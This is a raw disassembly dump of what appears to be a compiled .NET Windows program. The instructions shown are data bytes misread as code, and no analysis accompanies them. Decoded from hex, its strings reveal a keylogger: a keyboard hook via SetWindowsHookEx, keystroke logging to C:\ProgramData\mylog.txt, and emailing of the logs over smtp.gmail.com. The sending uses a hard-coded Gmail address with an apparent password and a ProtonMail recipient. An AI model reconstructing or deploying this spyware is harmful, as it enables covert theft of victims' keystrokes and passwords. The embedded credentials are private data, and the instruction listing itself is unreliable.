  4030d9:	6d                   	insl   (%dx),%es:(%edi)
  4030da:	49                   	dec    %ecx
  4030db:	6e                   	outsb  %ds:(%esi),(%dx)
  4030dc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4030de:	00 5a 65             	add    %bl,0x65(%edx)
  4030e1:	72 6f                	jb     0x403152
  4030e3:	00 67 65             	add    %ah,0x65(%edi)
  4030e6:	74 5f                	je     0x403147
  4030e8:	59                   	pop    %ecx
  4030e9:	65 61                	gs popa
  4030eb:	72 00                	jb     0x4030ed
  4030ed:	53                   	push   %ebx
  4030ee:	74 72                	je     0x403162
  4030f0:	65 61                	gs popa
  4030f2:	6d                   	insl   (%dx),%es:(%edi)
  4030f3:	52                   	push   %edx
  4030f4:	65 61                	gs popa
  4030f6:	64 65 72 00          	fs gs jb 0x4030fa
  4030fa:	54                   	push   %esp
  4030fb:	65 78 74             	gs js  0x403172
  4030fe:	52                   	push   %edx
  4030ff:	65 61                	gs popa
  403101:	64 65 72 00          	fs gs jb 0x403105
  403105:	62 75 66             	bound  %esi,0x66(%ebp)
  403108:	66 65 72 00          	data16 gs jb 0x40310c
  40310c:	53                   	push   %ebx
  40310d:	74 72                	je     0x403181
  40310f:	65 61                	gs popa
  403111:	6d                   	insl   (%dx),%es:(%edi)
  403112:	57                   	push   %edi
  403113:	72 69                	jb     0x40317e
  403115:	74 65                	je     0x40317c
  403117:	72 00                	jb     0x403119
  403119:	54                   	push   %esp
  40311a:	65 78 74             	gs js  0x403191
  40311d:	57                   	push   %edi
  40311e:	72 69                	jb     0x403189
  403120:	74 65                	je     0x403187
  403122:	72 00                	jb     0x403124
  403124:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  403129:	00 2e                	add    %ch,(%esi)
  40312b:	63 63 74             	arpl   %esp,0x74(%ebx)
  40312e:	6f                   	outsl  %ds:(%esi),(%dx)
  40312f:	72 00                	jb     0x403131
  403131:	49                   	dec    %ecx
  403132:	6e                   	outsb  %ds:(%esi),(%dx)
  403133:	74 50                	je     0x403185
  403135:	74 72                	je     0x4031a9
  403137:	00 53 79             	add    %dl,0x79(%ebx)
  40313a:	73 74                	jae    0x4031b0
  40313c:	65 6d                	gs insl (%dx),%es:(%edi)
  40313e:	2e 44                	cs inc %esp
  403140:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  403147:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  40314e:	74 65                	je     0x4031b5
  403150:	6d                   	insl   (%dx),%es:(%edi)
  403151:	2e 52                	cs push %edx
  403153:	75 6e                	jne    0x4031c3
  403155:	74 69                	je     0x4031c0
  403157:	6d                   	insl   (%dx),%es:(%edi)
  403158:	65 2e 49             	gs cs dec %ecx
  40315b:	6e                   	outsb  %ds:(%esi),(%dx)
  40315c:	74 65                	je     0x4031c3
  40315e:	72 6f                	jb     0x4031cf
  403160:	70 53                	jo     0x4031b5
  403162:	65 72 76             	gs jb  0x4031db
  403165:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40316c:	73 74                	jae    0x4031e2
  40316e:	65 6d                	gs insl (%dx),%es:(%edi)
  403170:	2e 52                	cs push %edx
  403172:	75 6e                	jne    0x4031e2
  403174:	74 69                	je     0x4031df
  403176:	6d                   	insl   (%dx),%es:(%edi)
  403177:	65 2e 43             	gs cs inc %ebx
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	6d                   	insl   (%dx),%es:(%edi)
  40317c:	70 69                	jo     0x4031e7
  40317e:	6c                   	insb   (%dx),%es:(%edi)
  40317f:	65 72 53             	gs jb  0x4031d5
  403182:	65 72 76             	gs jb  0x4031fb
  403185:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40318c:	62 75 67             	bound  %esi,0x67(%ebp)
  40318f:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  403196:	65 
  403197:	73 00                	jae    0x403199
  403199:	61                   	popa
  40319a:	72 67                	jb     0x403203
  40319c:	73 00                	jae    0x40319e
  40319e:	73 65                	jae    0x403205
  4031a0:	74 5f                	je     0x403201
  4031a2:	43                   	inc    %ebx
  4031a3:	72 65                	jb     0x40320a
  4031a5:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4031a8:	74 69                	je     0x403213
  4031aa:	61                   	popa
  4031ab:	6c                   	insb   (%dx),%es:(%edi)
  4031ac:	73 00                	jae    0x4031ae
  4031ae:	73 65                	jae    0x403215
  4031b0:	74 5f                	je     0x403211
  4031b2:	55                   	push   %ebp
  4031b3:	73 65                	jae    0x40321a
  4031b5:	44                   	inc    %esp
  4031b6:	65 66 61             	gs popaw
  4031b9:	75 6c                	jne    0x403227
  4031bb:	74 43                	je     0x403200
  4031bd:	72 65                	jb     0x403224
  4031bf:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4031c2:	74 69                	je     0x40322d
  4031c4:	61                   	popa
  4031c5:	6c                   	insb   (%dx),%es:(%edi)
  4031c6:	73 00                	jae    0x4031c8
  4031c8:	53                   	push   %ebx
  4031c9:	79 73                	jns    0x40323e
  4031cb:	74 65                	je     0x403232
  4031cd:	6d                   	insl   (%dx),%es:(%edi)
  4031ce:	2e 57                	cs push %edi
  4031d0:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4031d7:	46                   	inc    %esi
  4031d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4031d9:	72 6d                	jb     0x403248
  4031db:	73 00                	jae    0x4031dd
  4031dd:	47                   	inc    %edi
  4031de:	65 74 43             	gs je  0x403224
  4031e1:	75 72                	jne    0x403255
  4031e3:	72 65                	jb     0x40324a
  4031e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4031e6:	74 50                	je     0x403238
  4031e8:	72 6f                	jb     0x403259
  4031ea:	63 65 73             	arpl   %esp,0x73(%ebp)
  4031ed:	73 00                	jae    0x4031ef
  4031ef:	4d                   	dec    %ebp
  4031f0:	61                   	popa
  4031f1:	69 6c 41 64 64 72 65 	imul   $0x73657264,0x64(%ecx,%eax,2),%ebp
  4031f8:	73 
  4031f9:	73 00                	jae    0x4031fb
  4031fb:	67 65 74 5f          	addr16 gs je 0x40325e
  4031ff:	41                   	inc    %ecx
  403200:	74 74                	je     0x403276
  403202:	61                   	popa
  403203:	63 68 6d             	arpl   %ebp,0x6d(%eax)
  403206:	65 6e                	outsb  %gs:(%esi),(%dx)
  403208:	74 73                	je     0x40327d
  40320a:	00 67 65             	add    %ah,0x65(%edi)
  40320d:	74 5f                	je     0x40326e
  40320f:	45                   	inc    %ebp
  403210:	78 69                	js     0x40327b
  403212:	73 74                	jae    0x403288
  403214:	73 00                	jae    0x403216
  403216:	4b                   	dec    %ebx
  403217:	65 79 73             	gs jns 0x40328d
  40321a:	00 43 6f             	add    %al,0x6f(%ebx)
  40321d:	6e                   	outsb  %ds:(%esi),(%dx)
  40321e:	63 61 74             	arpl   %esp,0x74(%ecx)
  403221:	00 4f 62             	add    %cl,0x62(%edi)
  403224:	6a 65                	push   $0x65
  403226:	63 74 00 6f          	arpl   %esi,0x6f(%eax,%eax,1)
  40322a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40322d:	63 74 00 73          	arpl   %esi,0x73(%eax,%eax,1)
  403231:	65 74 5f             	gs je  0x403293
  403234:	53                   	push   %ebx
  403235:	75 62                	jne    0x403299
  403237:	6a 65                	push   $0x65
  403239:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  40323d:	79 73                	jns    0x4032b2
  40323f:	74 65                	je     0x4032a6
  403241:	6d                   	insl   (%dx),%es:(%edi)
  403242:	2e 4e                	cs dec %esi
  403244:	65 74 00             	gs je  0x403247
  403247:	6f                   	outsl  %ds:(%esi),(%dx)
  403248:	70 5f                	jo     0x4032a9
  40324a:	45                   	inc    %ebp
  40324b:	78 70                	js     0x4032bd
  40324d:	6c                   	insb   (%dx),%es:(%edi)
  40324e:	69 63 69 74 00 49 41 	imul   $0x41490074,0x69(%ebx),%esp
  403255:	73 79                	jae    0x4032d0
  403257:	6e                   	outsb  %ds:(%esi),(%dx)
  403258:	63 52 65             	arpl   %edx,0x65(%edx)
  40325b:	73 75                	jae    0x4032d2
  40325d:	6c                   	insb   (%dx),%es:(%edi)
  40325e:	74 00                	je     0x403260
  403260:	72 65                	jb     0x4032c7
  403262:	73 75                	jae    0x4032d9
  403264:	6c                   	insb   (%dx),%es:(%edi)
  403265:	74 00                	je     0x403267
  403267:	53                   	push   %ebx
  403268:	6d                   	insl   (%dx),%es:(%edi)
  403269:	74 70                	je     0x4032db
  40326b:	43                   	inc    %ebx
  40326c:	6c                   	insb   (%dx),%es:(%edi)
  40326d:	69 65 6e 74 00 41 74 	imul   $0x74410074,0x6e(%ebp),%esp
  403274:	74 61                	je     0x4032d7
  403276:	63 68 6d             	arpl   %ebp,0x6d(%eax)
  403279:	65 6e                	outsb  %gs:(%esi),(%dx)
  40327b:	74 00                	je     0x40327d
  40327d:	45                   	inc    %ebp
  40327e:	6e                   	outsb  %ds:(%esi),(%dx)
  40327f:	76 69                	jbe    0x4032ea
  403281:	72 6f                	jb     0x4032f2
  403283:	6e                   	outsb  %ds:(%esi),(%dx)
  403284:	6d                   	insl   (%dx),%es:(%edi)
  403285:	65 6e                	outsb  %gs:(%esi),(%dx)
  403287:	74 00                	je     0x403289
  403289:	54                   	push   %esp
  40328a:	68 72 65 61 64       	push   $0x64616572
  40328f:	53                   	push   %ebx
  403290:	74 61                	je     0x4032f3
  403292:	72 74                	jb     0x403308
  403294:	00 73 65             	add    %dh,0x65(%ebx)
  403297:	74 5f                	je     0x4032f8
  403299:	50                   	push   %eax
  40329a:	6f                   	outsl  %ds:(%esi),(%dx)
  40329b:	72 74                	jb     0x403311
  40329d:	00 49 43             	add    %cl,0x43(%ecx)
  4032a0:	72 65                	jb     0x403307
  4032a2:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4032a5:	74 69                	je     0x403310
  4032a7:	61                   	popa
  4032a8:	6c                   	insb   (%dx),%es:(%edi)
  4032a9:	73 42                	jae    0x4032ed
  4032ab:	79 48                	jns    0x4032f5
  4032ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ae:	73 74                	jae    0x403324
  4032b0:	00 67 65             	add    %ah,0x65(%edi)
  4032b3:	74 5f                	je     0x403314
  4032b5:	4f                   	dec    %edi
  4032b6:	75 74                	jne    0x40332c
  4032b8:	00 67 65             	add    %ah,0x65(%edi)
  4032bb:	74 5f                	je     0x40331c
  4032bd:	4e                   	dec    %esi
  4032be:	6f                   	outsl  %ds:(%esi),(%dx)
  4032bf:	77 00                	ja     0x4032c1
  4032c1:	55                   	push   %ebp
  4032c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4032c3:	68 6f 6f 6b 57       	push   $0x576b6f6f
  4032c8:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  4032cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d1:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4032d5:	53                   	push   %ebx
  4032d6:	65 74 57             	gs je  0x403330
  4032d9:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  4032e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032e2:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4032e6:	43                   	inc    %ebx
  4032e7:	61                   	popa
  4032e8:	6c                   	insb   (%dx),%es:(%edi)
  4032e9:	6c                   	insb   (%dx),%es:(%edi)
  4032ea:	4e                   	dec    %esi
  4032eb:	65 78 74             	gs js  0x403362
  4032ee:	48                   	dec    %eax
  4032ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f1:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4032f5:	67 65 74 5f          	addr16 gs je 0x403358
  4032f9:	44                   	inc    %esp
  4032fa:	61                   	popa
  4032fb:	79 00                	jns    0x4032fd
  4032fd:	73 65                	jae    0x403364
  4032ff:	74 5f                	je     0x403360
  403301:	42                   	inc    %edx
  403302:	6f                   	outsl  %ds:(%esi),(%dx)
  403303:	64 79 00             	fs jns 0x403306
  403306:	6f                   	outsl  %ds:(%esi),(%dx)
  403307:	70 5f                	jo     0x403368
  403309:	45                   	inc    %ebp
  40330a:	71 75                	jno    0x403381
  40330c:	61                   	popa
  40330d:	6c                   	insb   (%dx),%es:(%edi)
  40330e:	69 74 79 00 00 00 00 	imul   $0x31000000,0x0(%ecx,%edi,2),%esi
  403315:	31 
  403316:	43                   	inc    %ebx
  403317:	00 3a                	add    %bh,(%edx)
  403319:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  40331d:	00 72 00             	add    %dh,0x0(%edx)
  403320:	6f                   	outsl  %ds:(%esi),(%dx)
  403321:	00 67 00             	add    %ah,0x0(%edi)
  403324:	72 00                	jb     0x403326
  403326:	61                   	popa
  403327:	00 6d 00             	add    %ch,0x0(%ebp)
  40332a:	44                   	inc    %esp
  40332b:	00 61 00             	add    %ah,0x0(%ecx)
  40332e:	74 00                	je     0x403330
  403330:	61                   	popa
  403331:	00 5c 00 6d          	add    %bl,0x6d(%eax,%eax,1)
  403335:	00 79 00             	add    %bh,0x0(%ecx)
  403338:	6c                   	insb   (%dx),%es:(%edi)
  403339:	00 6f 00             	add    %ch,0x0(%edi)
  40333c:	67 00 2e 00 74       	add    %ch,0x7400
  403341:	00 78 00             	add    %bh,0x0(%eax)
  403344:	74 00                	je     0x403346
  403346:	00 01                	add    %al,(%ecx)
  403348:	00 41 43             	add    %al,0x43(%ecx)
  40334b:	00 3a                	add    %bh,(%edx)
  40334d:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  403351:	00 72 00             	add    %dh,0x0(%edx)
  403354:	6f                   	outsl  %ds:(%esi),(%dx)
  403355:	00 67 00             	add    %ah,0x0(%edi)
  403358:	72 00                	jb     0x40335a
  40335a:	61                   	popa
  40335b:	00 6d 00             	add    %ch,0x0(%ebp)
  40335e:	44                   	inc    %esp
  40335f:	00 61 00             	add    %ah,0x0(%ecx)
  403362:	74 00                	je     0x403364
  403364:	61                   	popa
  403365:	00 5c 00 6d          	add    %bl,0x6d(%eax,%eax,1)
  403369:	00 79 00             	add    %bh,0x0(%ecx)
  40336c:	6c                   	insb   (%dx),%es:(%edi)
  40336d:	00 6f 00             	add    %ch,0x0(%edi)
  403370:	67 00 5f 00          	add    %bl,0x0(%bx)
  403374:	61                   	popa
  403375:	00 72 00             	add    %dh,0x0(%edx)
  403378:	63 00                	arpl   %eax,(%eax)
  40337a:	68 00 69 00 76       	push   $0x76006900
  40337f:	00 65 00             	add    %ah,0x0(%ebp)
  403382:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  403387:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40338b:	25 0a 00 0a 00       	and    $0xa000a,%eax
  403390:	2a 00                	sub    (%eax),%al
  403392:	2a 00                	sub    (%eax),%al
  403394:	4d                   	dec    %ebp
  403395:	00 41 00             	add    %al,0x0(%ecx)
  403398:	49                   	dec    %ecx
  403399:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  40339d:	00 45 00             	add    %al,0x0(%ebp)
  4033a0:	4e                   	dec    %esi
  4033a1:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  4033a5:	00 4e 00             	add    %cl,0x0(%esi)
  4033a8:	47                   	inc    %edi
  4033a9:	00 2a                	add    %ch,(%edx)
  4033ab:	00 2a                	add    %ch,(%edx)
  4033ad:	00 0a                	add    %cl,(%edx)
  4033af:	00 00                	add    %al,(%eax)
  4033b1:	13 4f 00             	adc    0x0(%edi),%ecx
  4033b4:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4033b8:	50                   	push   %eax
  4033b9:	00 65 00             	add    %ah,0x0(%ebp)
  4033bc:	72 00                	jb     0x4033be
  4033be:	69 00 6f 00 64 00    	imul   $0x64006f,(%eax),%eax
  4033c4:	00 03                	add    %al,(%ebx)
  4033c6:	2e 00 00             	add    %al,%cs:(%eax)
  4033c9:	11 4f 00             	adc    %ecx,0x0(%edi)
  4033cc:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4033d0:	63 00                	arpl   %eax,(%eax)
  4033d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d3:	00 6d 00             	add    %ch,0x0(%ebp)
  4033d6:	6d                   	insl   (%dx),%es:(%edi)
  4033d7:	00 61 00             	add    %ah,0x0(%ecx)
  4033da:	00 03                	add    %al,(%ebx)
  4033dc:	2c 00                	sub    $0x0,%al
  4033de:	00 0b                	add    %cl,(%ebx)
  4033e0:	53                   	push   %ebx
  4033e1:	00 70 00             	add    %dh,0x0(%eax)
  4033e4:	61                   	popa
  4033e5:	00 63 00             	add    %ah,0x0(%ebx)
  4033e8:	65 00 00             	add    %al,%gs:(%eax)
  4033eb:	03 20                	add    (%eax),%esp
  4033ed:	00 00                	add    %al,(%eax)
  4033ef:	1d 73 00 6d 00       	sbb    $0x6d0073,%eax
  4033f4:	74 00                	je     0x4033f6
  4033f6:	70 00                	jo     0x4033f8
  4033f8:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  4033fc:	6d                   	insl   (%dx),%es:(%edi)
  4033fd:	00 61 00             	add    %ah,0x0(%ecx)
  403400:	69 00 6c 00 2e 00    	imul   $0x2e006c,(%eax),%eax
  403406:	63 00                	arpl   %eax,(%eax)
  403408:	6f                   	outsl  %ds:(%esi),(%dx)
  403409:	00 6d 00             	add    %ch,0x0(%ebp)
  40340c:	00 35 4a 00 61 00    	add    %dh,0x61004a
  403412:	79 00                	jns    0x403414
  403414:	6e                   	outsb  %ds:(%esi),(%dx)
  403415:	00 65 00             	add    %ah,0x0(%ebp)
  403418:	53                   	push   %ebx
  403419:	00 61 00             	add    %ah,0x0(%ecx)
  40341c:	75 00                	jne    0x40341e
  40341e:	6e                   	outsb  %ds:(%esi),(%dx)
  40341f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  403423:	00 72 00             	add    %dh,0x0(%edx)
  403426:	73 00                	jae    0x403428
  403428:	39 00                	cmp    %eax,(%eax)
  40342a:	32 00                	xor    (%eax),%al
  40342c:	33 00                	xor    (%eax),%eax
  40342e:	40                   	inc    %eax
  40342f:	00 67 00             	add    %ah,0x0(%edi)
  403432:	6d                   	insl   (%dx),%es:(%edi)
  403433:	00 61 00             	add    %ah,0x0(%ecx)
  403436:	69 00 6c 00 2e 00    	imul   $0x2e006c,(%eax),%eax
  40343c:	63 00                	arpl   %eax,(%eax)
  40343e:	6f                   	outsl  %ds:(%esi),(%dx)
  40343f:	00 6d 00             	add    %ch,0x0(%ebp)
  403442:	00 11                	add    %dl,(%ecx)
  403444:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  403448:	77 00                	ja     0x40344a
  40344a:	33 00                	xor    (%eax),%eax
  40344c:	34 00                	xor    $0x0,%al
  40344e:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  403452:	67 00 00             	add    %al,(%bx,%si)
  403455:	07                   	pop    %es
  403456:	20 00                	and    %al,(%eax)
  403458:	2d 00 20 00 01       	sub    $0x1002000,%eax
  40345d:	15 74 00 65 00       	adc    $0x650074,%eax
  403462:	78 00                	js     0x403464
  403464:	74 00                	je     0x403466
  403466:	2f                   	das
  403467:	00 70 00             	add    %dh,0x0(%eax)
  40346a:	6c                   	insb   (%dx),%es:(%edi)
  40346b:	00 61 00             	add    %ah,0x0(%ecx)
  40346e:	69 00 6e 00 00 35    	imul   $0x3500006e,(%eax),%eax
  403474:	52                   	push   %edx
  403475:	00 75 00             	add    %dh,0x0(%ebp)
  403478:	62 00                	bound  %eax,(%eax)
  40347a:	79 00                	jns    0x40347c
  40347c:	79 00                	jns    0x40347e
  40347e:	54                   	push   %esp
  40347f:	00 42 00             	add    %al,0x0(%edx)
  403482:	75 00                	jne    0x403484
  403484:	72 00                	jb     0x403486
  403486:	6b 00 65             	imul   $0x65,(%eax),%eax
  403489:	00 40 00             	add    %al,0x0(%eax)
  40348c:	70 00                	jo     0x40348e
  40348e:	72 00                	jb     0x403490
  403490:	6f                   	outsl  %ds:(%esi),(%dx)
  403491:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  403495:	00 6e 00             	add    %ch,0x0(%esi)
  403498:	6d                   	insl   (%dx),%es:(%edi)
  403499:	00 61 00             	add    %ah,0x0(%ecx)
  40349c:	69 00 6c 00 2e 00    	imul   $0x2e006c,(%eax),%eax
  4034a2:	63 00                	arpl   %eax,(%eax)
  4034a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4034a5:	00 6d 00             	add    %ch,0x0(%ebp)
  4034a8:	00 00                	add    %al,(%eax)
  4034aa:	00 00                	add    %al,(%eax)
  4034ac:	fd                   	std
  4034ad:	5d                   	pop    %ebp
  4034ae:	4e                   	dec    %esi
  4034af:	57                   	push   %edi
  4034b0:	c0 73 19 4e          	shlb   $0x4e,0x19(%ebx)
  4034b4:	91                   	xchg   %eax,%ecx
  4034b5:	d9 d8                	(bad)
  4034b7:	db 99 ce 15 7d 00    	fistpl 0x7d15ce(%ecx)
  4034bd:	04 20                	add    $0x20,%al
  4034bf:	01 01                	add    %eax,(%ecx)
  4034c1:	08 03                	or     %al,(%ebx)
  4034c3:	20 00                	and    %al,(%eax)
  4034c5:	01 05 20 01 01 11    	add    %eax,0x11010120
  4034cb:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4034ce:	01 01                	add    %eax,(%ecx)
  4034d0:	0e                   	push   %cs
  4034d1:	04 20                	add    $0x20,%al
  4034d3:	01 01                	add    %eax,(%ecx)
  4034d5:	02 03                	add    (%ebx),%al
  4034d7:	00 00                	add    %al,(%eax)
  4034d9:	01 14 07             	add    %edx,(%edi,%eax,1)
  4034dc:	0d 12 45 02 12       	or     $0x12024512,%eax
  4034e1:	49                   	dec    %ecx
  4034e2:	02 12                	add    (%edx),%dl
  4034e4:	4d                   	dec    %ebp
  4034e5:	12 51 02             	adc    0x2(%ecx),%dl
  4034e8:	08 02                	or     %al,(%edx)
  4034ea:	11 55 02             	adc    %edx,0x2(%ebp)
  4034ed:	02 18                	add    (%eax),%bl
  4034ef:	03 20                	add    (%eax),%esp
  4034f1:	00 08                	add    %cl,(%eax)
  4034f3:	05 20 02 01 0e       	add    $0xe010220,%eax
  4034f8:	02 03                	add    (%ebx),%al
  4034fa:	20 00                	and    %al,(%eax)
  4034fc:	02 03                	add    (%ebx),%al
  4034fe:	20 00                	and    %al,(%eax)
  403500:	0a 06                	or     (%esi),%al
  403502:	20 02                	and    %al,(%edx)
  403504:	12 45 0e             	adc    0xe(%ebp),%al
  403507:	02 05 20 02 01 1c    	add    0x1c010220,%al
  40350d:	18 06                	sbb    %al,(%esi)
  40350f:	20 01                	and    %al,(%ecx)
  403511:	01 12                	add    %edx,(%edx)
  403513:	80 91 05 00 00 12 80 	adcb   $0x80,0x12000005(%ecx)
  40351a:	89 03                	mov    %eax,(%ebx)
  40351c:	20 00                	and    %al,(%eax)
  40351e:	0e                   	push   %cs
  40351f:	04 00                	add    $0x0,%al
  403521:	01 18                	add    %ebx,(%eax)
  403523:	08 05 00 02 02 18    	or     %al,0x18020200
  403529:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40352c:	01 08                	add    %ecx,(%eax)
  40352e:	18 05 00 02 02 0e    	sbb    %al,0xe020200
  403534:	0e                   	push   %cs
  403535:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40353a:	0e                   	push   %cs
  40353b:	04 20                	add    $0x20,%al
  40353d:	01 01                	add    %eax,(%ecx)
  40353f:	1c 02                	sbb    $0x2,%al
  403541:	06                   	push   %es
  403542:	18 13                	sbb    %dl,(%ebx)
  403544:	07                   	pop    %es
  403545:	0a 12                	or     (%edx),%dl
  403547:	59                   	pop    %ecx
  403548:	0e                   	push   %cs
  403549:	12 5d 12             	adc    0x12(%ebp),%bl
  40354c:	61                   	popa
  40354d:	12 61 11             	adc    0x11(%ecx),%ah
  403550:	65 08 02             	or     %al,%gs:(%edx)
  403553:	12 69 12             	adc    0x12(%ecx),%ch
  403556:	51                   	push   %ecx
  403557:	06                   	push   %es
  403558:	20 01                	and    %al,(%ecx)
  40355a:	01 11                	add    %edx,(%ecx)
  40355c:	80 a5 05 20 02 01 0e 	andb   $0xe,0x1022005(%ebp)
  403563:	0e                   	push   %cs
  403564:	06                   	push   %es
  403565:	20 01                	and    %al,(%ecx)
  403567:	01 12                	add    %edx,(%edx)
  403569:	80 ad 06 20 01 01 12 	subb   $0x12,0x1012006(%ebp)
  403570:	80 b1 03 00 00 0e 04 	xorb   $0x4,0xe000003(%ecx)
  403577:	00 00                	add    %al,(%eax)
  403579:	11 65 05             	adc    %esp,0x5(%ebp)
  40357c:	00 01                	add    %al,(%ecx)
  40357e:	0e                   	push   %cs
  40357f:	1d 0e 05 20 00       	sbb    $0x20050e,%eax
  403584:	12 80 bd 07 15 12    	adc    0x121507bd(%eax),%al
  40358a:	80 c1 01             	add    $0x1,%cl
  40358d:	12 69 05             	adc    0x5(%ecx),%ch
  403590:	20 01                	and    %al,(%ecx)
  403592:	01 13                	add    %edx,(%ebx)
  403594:	00 05 20 00 12 80    	add    %al,0x80120020
  40359a:	c5 05 20 01 01 12    	lds    0x12010120,%eax
  4035a0:	61                   	popa
  4035a1:	09 07                	or     %eax,(%edi)
  4035a3:	05 12 6d 12 71       	add    $0x71126d12,%eax
  4035a8:	0e                   	push   %cs
  4035a9:	18 18                	sbb    %bl,(%eax)
  4035ab:	04 00                	add    $0x0,%al
  4035ad:	00 12                	add    %dl,(%edx)
  4035af:	6d                   	insl   (%dx),%es:(%edi)
  4035b0:	04 20                	add    $0x20,%al
  4035b2:	00 12                	add    %dl,(%edx)
  4035b4:	71 08                	jno    0x4035be
  4035b6:	b7 7a                	mov    $0x7a,%bh
  4035b8:	5c                   	pop    %esp
  4035b9:	56                   	push   %esi
  4035ba:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4035bd:	89 34 4a             	mov    %esi,(%edx,%ecx,2)
  4035c0:	00 61 00             	add    %ah,0x0(%ecx)
  4035c3:	79 00                	jns    0x4035c5
  4035c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4035c6:	00 65 00             	add    %ah,0x0(%ebp)
  4035c9:	53                   	push   %ebx
  4035ca:	00 61 00             	add    %ah,0x0(%ecx)
  4035cd:	75 00                	jne    0x4035cf
  4035cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4035d0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4035d4:	00 72 00             	add    %dh,0x0(%edx)
  4035d7:	73 00                	jae    0x4035d9
  4035d9:	39 00                	cmp    %eax,(%eax)
  4035db:	32 00                	xor    (%eax),%al
  4035dd:	33 00                	xor    (%eax),%eax
  4035df:	40                   	inc    %eax
  4035e0:	00 67 00             	add    %ah,0x0(%edi)
  4035e3:	6d                   	insl   (%dx),%es:(%edi)
  4035e4:	00 61 00             	add    %ah,0x0(%ecx)
  4035e7:	69 00 6c 00 2e 00    	imul   $0x2e006c,(%eax),%eax
  4035ed:	63 00                	arpl   %eax,(%eax)
  4035ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f0:	00 6d 00             	add    %ch,0x0(%ebp)
  4035f3:	10 64 00 65          	adc    %ah,0x65(%eax,%eax,1)
  4035f7:	00 77 00             	add    %dh,0x0(%edi)
  4035fa:	33 00                	xor    (%eax),%eax
  4035fc:	34 00                	xor    $0x0,%al
  4035fe:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  403602:	67 00 34             	add    %dh,(%si)
  403605:	52                   	push   %edx
  403606:	00 75 00             	add    %dh,0x0(%ebp)
  403609:	62 00                	bound  %eax,(%eax)
  40360b:	79 00                	jns    0x40360d
  40360d:	79 00                	jns    0x40360f
  40360f:	54                   	push   %esp
  403610:	00 42 00             	add    %al,0x0(%edx)
  403613:	75 00                	jne    0x403615
  403615:	72 00                	jb     0x403617
  403617:	6b 00 65             	imul   $0x65,(%eax),%eax
  40361a:	00 40 00             	add    %al,0x0(%eax)
  40361d:	70 00                	jo     0x40361f
  40361f:	72 00                	jb     0x403621
  403621:	6f                   	outsl  %ds:(%esi),(%dx)
  403622:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  403626:	00 6e 00             	add    %ch,0x0(%esi)
  403629:	6d                   	insl   (%dx),%es:(%edi)
  40362a:	00 61 00             	add    %ah,0x0(%ecx)
  40362d:	69 00 6c 00 2e 00    	imul   $0x2e006c,(%eax),%eax
  403633:	63 00                	arpl   %eax,(%eax)
  403635:	6f                   	outsl  %ds:(%esi),(%dx)
  403636:	00 6d 00             	add    %ch,0x0(%ebp)
  403639:	30 43 00             	xor    %al,0x0(%ebx)
  40363c:	3a 00                	cmp    (%eax),%al
  40363e:	5c                   	pop    %esp
  40363f:	00 50 00             	add    %dl,0x0(%eax)
  403642:	72 00                	jb     0x403644
  403644:	6f                   	outsl  %ds:(%esi),(%dx)
  403645:	00 67 00             	add    %ah,0x0(%edi)
  403648:	72 00                	jb     0x40364a
  40364a:	61                   	popa
  40364b:	00 6d 00             	add    %ch,0x0(%ebp)
  40364e:	44                   	inc    %esp
  40364f:	00 61 00             	add    %ah,0x0(%ecx)
  403652:	74 00                	je     0x403654
  403654:	61                   	popa
